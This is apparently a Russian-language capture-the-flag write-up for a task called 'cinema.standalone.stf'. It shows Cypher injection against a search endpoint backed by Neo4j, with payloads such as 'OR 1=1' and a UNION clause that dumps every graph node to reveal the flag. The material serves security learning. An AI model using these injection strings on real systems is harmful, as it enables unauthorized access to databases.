cinema.standalone.stf
Cinema — это стриминговая платформа нового поколения. Мы развиваем собственные алгоритмы рекомендаций и генеративного подбора контента, чтобы вы тратили время на просмотр, а не на поиск фильма.
Мы соберем личную кинематографическую коллекцию: фильмы и сериалы, которые вам действительно хочется смотреть.
<img width="808" height="393" alt="image" src="https://github.com/user-attachments/assets/93207a26-6dc3-4bf5-ba23-8abe12d8c59c" />

в соурсе вижу бандлы, чекаем их на ручки

Neo4j — графовая СУБД. Данные хранятся не как таблицы «строка = запись», а как граф:

ноды (узлы) — сущности


связи (relationships) — рёбра между ними


свойства (properties) — поля на ноде/связи (как колонки)


Язык запросов — Cypher (похож на ASCII-рисунок графа).


<img width="1117" height="564" alt="image" src="https://github.com/user-attachments/assets/a87516cb-4c66-4448-98f2-c82212d7b785" />

  <img width="1117" height="564" alt="image" src="https://github.com/user-attachments/assets/cb4e6ac5-5d85-43ec-ae48-ee05be1d9bac" />
  
 
было найдена такая ручка fetch(`${X2}/search_similar?q=${encodeURIComponent(r)}

http://10.124.249.27/api/search_similar?q=Matrix

search_results": "error in substitution of the parameter MATCH (m:Movie)"

 <img width="913" height="1005" alt="image" src="https://github.com/user-attachments/assets/ed03e5c9-0282-4be7-9479-ac0953f0ec93" />


Matrixx' OR 1=1 RETURN m //

MATCH (m:Movie)
WHERE m.title CONTAINS 'Matrixx' OR 1=1 RETURN m //'
...
у нас нет тайтла как Matrixx, поэтому выводятся все фильмы

Это больше как PoC, что инъекция работает

 <img width="913" height="1005" alt="image" src="https://github.com/user-attachments/assets/6815367c-7de4-40c4-834f-762d13605275" />


x' RETURN m UNION MATCH (m) RETURN m //

MATCH (m:Movie)
WHERE m.title CONTAINS 'x' RETURN m
UNION
MATCH (m) RETURN m
//'
...


Первый запрос у нас отдает все фильмы, благодаря UNION мы склеиваем к первому запросу второй, где мы берем любые ноды(без лейбла Movie)

Ну и смотрим все ноды и находим flag

<img width="1172" height="613" alt="image" src="https://github.com/user-attachments/assets/d0cc27e3-b3e8-493e-ad86-7d5b8b6b9a30" />
